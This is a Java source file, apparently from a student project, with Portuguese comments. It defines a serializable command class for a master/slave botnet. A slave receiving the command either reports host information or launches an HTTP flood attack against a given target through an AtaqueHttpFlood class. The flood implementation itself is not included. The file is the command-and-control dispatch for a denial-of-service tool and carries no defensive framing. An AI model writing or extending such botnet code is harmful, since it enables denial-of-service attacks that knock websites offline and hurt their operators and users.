/*
 * Classe comando
 * representa um comando a ser executado no slave 
 * retorna resultado para ser interpretado pelo Master
 */
package edu.br.utfpr.projectingrid.Core;

import edu.br.utfpr.projectingrid.Core.ataques.AtaqueHttpFlood;
import java.io.Serializable;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Francisco Xavier
 */
public class Comando implements Serializable{
    private static final long serialVersionUID = 1L;
    private String comando;
    private String alvo;
    public Comando(String comando){
        this.comando = comando;
    }
    
    public Comando(String comando,String alvo){
        this.comando = comando;
        this.alvo = alvo;
    }
    
    public Comando(){
        
    }
    public Object executar(Host host){
        if(comando.equals("HostInfo")){
            return host;
        }else if(comando.equals("HttpFlood")){
            try {
                AtaqueHttpFlood httpFlood = new AtaqueHttpFlood(alvo);
                httpFlood.start();
                
            } catch (Exception ex) {
            
                Logger.getLogger(Comando.class.getName()).log(Level.SEVERE, null, ex);
            
            }
            return null;
        }else{
            return null;
        }
    }
    
    
}
